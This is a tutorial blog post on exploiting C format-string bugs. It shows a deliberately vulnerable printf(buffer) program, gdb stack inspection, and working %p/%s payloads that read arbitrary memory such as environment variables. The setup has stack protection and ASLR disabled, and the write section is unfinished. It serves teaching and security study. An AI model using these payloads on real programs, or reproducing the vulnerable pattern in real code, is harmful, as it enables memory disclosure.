---
layout: post
title: subverting-printf
excerpt: "Using malformed printf statements to arbitrarily read and write memory."
categories: [tech]
tags: [itsec, howto]
comments: false
---

TODO: update instructions
To follow this post you may need a modicum of C know-how as well as some familiarity with `gdb`. In regards to compile flags, we're using `-g` to include debugging information (which will be used by `gdb`) and `-m32` to compile to 32 bits (I'm using a 64 bits machine and you probably are too) - but 32 bit is easier to understand. 

I'll also be using the `-fno-stack-protector` option which is enabled by default on modern versions of `gdb` and ASLR (Address Space Layout Reandomisation) has been disabled via `sudo echo 0 | tee /proc/sys/kernel/randomize_va_space`.

Note that I am supressing warnings with the `-w` flag - that's intentional and solely for the purpose of this exercise!

## `printf` calling convention

Let's start by looking at how `printf` is called from an assembly perspective. Here's the `C` code:

~~~ c
#include <stdlib.h>

int
main(int argc, char* argv[])
{
  unsigned int var = 0xAAAAAAAA;
  char buffer[512];
  strcpy(buffer, argv[1]);

  printf("Caller passed in string %s, var is located at 0x%08x", buffer, &var);
  printf("\n");

  exit(0);
}
~~~

Let's compile that and check the corresponding assembly in `gdb`:

~~~ shell
vagrant@vagrant:~/scratch$ gcc -m32 -g -fno-stack-protector -w printf_c.c
vagrant@vagrant:~/scratch$ gdb -q ./a.out
Reading symbols from ./a.out...done.
(gdb) list 10
5       main(int argc, char* argv[])
6       {
7         unsigned int var = 0xAAAAAAAA;
8         char buffer[512];
9         strcpy(buffer, argv[1]);
10
11        printf("Caller passed in string %s, var is located at 0x%08x", buffer, &var);
12        printf("\n");
13
14        exit(0);
(gdb) break 11
Breakpoint 1 at 0x80484d3: file printf_c.c, line 11.
(gdb) set disassemble-next-line on
(gdb) run foo
Starting program: /home/vagrant/scratch/a.out foo

Breakpoint 1, main (argc=2, argv=0xffffdc24) at printf_c.c:11
11        printf("Caller passed in string %s, var is located at 0x%08x", buffer, &var);
=> 0x080484d3 <main+56>:        83 ec 04                sub    esp,0x4
   0x080484d6 <main+59>:        8d 45 f4                lea    eax,[ebp-0xc]
   0x080484d9 <main+62>:        50                      push   eax
   0x080484da <main+63>:        8d 85 f4 fd ff ff       lea    eax,[ebp-0x20c]
   0x080484e0 <main+69>:        50                      push   eax
   0x080484e1 <main+70>:        68 90 85 04 08          push   0x8048590
   0x080484e6 <main+75>:        e8 55 fe ff ff          call   0x8048340 <printf@plt>
   0x080484eb <main+80>:        83 c4 10                add    esp,0x10
~~~ 

We see that we push 3 things on top of the stack before the `call`. Let's see those in more details:

~~~ shell
(gdb) break *0x080484e6
Breakpoint 2 at 0x80484e6: file printf_c.c, line 11.
(gdb) set disassemble-next-line off
(gdb) c
Continuing.

Breakpoint 2, 0x080484e6 in main (argc=2, argv=0xffffdc24) at printf_c.c:11
11        printf("Caller passed in string %s, var is located at 0x%08x", buffer, &var);
(gdb) x/4wx $esp
0xffffd950:     0x08048590      0xffffd96c      0xffffdb6c      0xf7fefe7a
(gdb) x/s 0x08048590
0x8048590:      "Caller passed in string %s, var is located at 0x%08x"
(gdb) x/s 0xffffd96c
0xffffd96c:     "foo"
(gdb) x/x 0xffffdb6c
0xffffdb6c:     0xaa
(gdb) x/4x 0xffffdb6c
0xffffdb6c:     0xaa    0xaa    0xaa    0xaa
~~~

As we can see, we have 3 addresses - each corresponding to an argument given to `printf`. The string to be interpolated is pushed first, and the arguments next.

`printf` takes a variable number of arguments thought. So how does it know what to look for on the stack? It parses the format string.

## Reading arbitrary addresses

As we saw above, `printf` expects all its arguments (determined by the format string) to be on the stack - and when they're passed in properly that works just fine. But sometimes people are forgetfull and end up doing the following:

~~~ c
#include <stdlib.h>
#include <stdio.h>

int
main(int argc, char* argv[])
{
  char buffer[512];
  strcpy(buffer, argv[1]);

  printf(buffer);
  printf("\n");

  exit(0);
}
~~~

Which works as expected *as long as* the caller does not include a format string:

~~~ shell
vagrant@vagrant:~/scratch$ gcc -m32 -g -fno-stack-protector -w printf_c.c
vagrant@vagrant:~/scratch$ ./a.out hello
hello
vagrant@vagrant:~/scratch$ ./a.out hello%08x
helloffb5ad8b
~~~

So what just happened? `printf` parsed the format string and decided it needed an extra argument - and just took the next item on the stack and displayed it as a 4-bytes word. Let's try that again with a more contrived example:

~~~ shell
vagrant@vagrant:~/scratch$ ./a.out DDDD$(perl -e "print '%p..'x12")
DDDD0xffdf3d60..0xf77d8f1c..0xf77cbe7a..0x8..0xf77cbe66..0xf77d9000..0x44444444..0x2e2e7025..0x2e2e7025..0x2e2e7025..0x2e2e7025..0x2e2e7025..
~~~

The `0x44444444` looks suspicious, and so does the repeating `0x2e2e7025`. Sure enough:

~~~ shell
vagrant@vagrant:~/scratch$ printf "\x44\x44\x44\x44\n"
DDDD
vagrant@vagrant:~/scratch$ printf "\x2e\x2e\x70\x25\n"
..p%
~~~

Do remember we're using little-endian, so the bytes are printed backwards. Unlike the first example where the format string was located at `0x08048590`, this time *it has been placed fully on the stack*! And as we walk down the stack we encounter what we put on.

This unfortunately means we cannot read past our input using `%p` - but we can trick `printf` into reading a string at a memory location of our choosing. If we use the `%s` format, `printf` will use what's on the stack  as the address of a string and will read until a null byte is found. But what shall we read? Let's try an environment variable.

Now `gdb` does some funky stuff meaning the environment we execute under differs to the one outside. Thankfully there's something we can do about it but it's a little messy (I'm sure there *must* be a better way). We'll use `env -i` to ignore the current environment. Let's also figure out where we need to place our `%s`:

~~~ shell
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "DDDD" + "%p.."*5')
DDDD0xffffdd54..0xf7ffd000..0xf7fefec9..0x44444444..0x2e2e7025..
~~~

This means we should have 3 `%p` before adding our `%s` - which, as it stands, would cause `printf` to try and read the string located at `0x44444444` which sure enough, segfaults:

~~~ shell
vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "DDDD" + "%p.."*3 + "%s"')
Segmentation fault (core dumped)
~~~

We need to figure out where our environment variable is located:

~~~ shell
vagrant@vagrant:~/scratch$ env -i PWD=$(pwd) SOME_VAR=foobar gdb -q --args /home/vagrant/scratch/a.out $(python -c 'print "DDDD" + "%p.."*3 + "%s"')
Reading symbols from /home/vagrant/scratch/a.out...done.
(gdb) show env
PWD=/home/vagrant/scratch
SOME_VAR=foobar
LINES=29
COLUMNS=211
~~~

Despite `env -i`, `gdb` still added stuff! Okay let's add that to our environment too.

~~~ shell
vagrant@vagrant:~/scratch$ env -i PWD=$(pwd) SOME_VAR=foobar LINES=29 COLUMNS=211 gdb -q --args /home/vagrant/scratch/a.out $(python -c 'print "DDDD" + "%p.."*3 + "%s"')
Reading symbols from /home/vagrant/scratch/a.out...done.
(gdb) show env
PWD=/home/vagrant/scratch
SOME_VAR=foobar
LINES=29
COLUMNS=211
(gdb) break main
Breakpoint 1 at 0x80484b1: file printf_c.c, line 8.
(gdb) r
Starting program: /home/vagrant/scratch/a.out DDDD%p..%p..%p..%s

Breakpoint 1, main (argc=2, argv=0xffffde84) at printf_c.c:8
8         strcpy(buffer, argv[1]);
(gdb) x/4s *environ
0xffffdf9d:     "SOME_VAR=foobar"
0xffffdfad:     "COLUMNS=211"
0xffffdfb9:     "PWD=/home/vagrant/scratch"
0xffffdfd3:     "LINES=29"
(gdb) p/x 0xffffdf9d+9
$1 = 0xffffdfa6
~~~

Again `gdb` makes things a little more difficult - the order of the variables differs from the one we specified. It just means we need to call our binary with the vars in that order - and `SOME_VAR` will be located at `0xffffdf9d` + 9 bytes (one for each character of `SOME_VAR=`). We're now ready to run this:

~~~ shell
vagrant@vagrant:~/scratch$ env -i SOME_VAR=foobar COLUMNS=211 LINES=29 PWD=/home/vagrant/scratch /home/vagrant/scratch/a.out $(python -c 'print "\xa6\xdf\xff\xff" + "%p.."*3 + "%s"')
▒▒0xffffdf8a..0xf7ffd000..0xf7fefec9..foobar
~~~

Success!

The astute reader would have pointed out this would have been *much* simpler using `getenv` but I was hell bent on getting this to work with `gdb`. Heh.

## Writing to an arbitrary address?

TBA
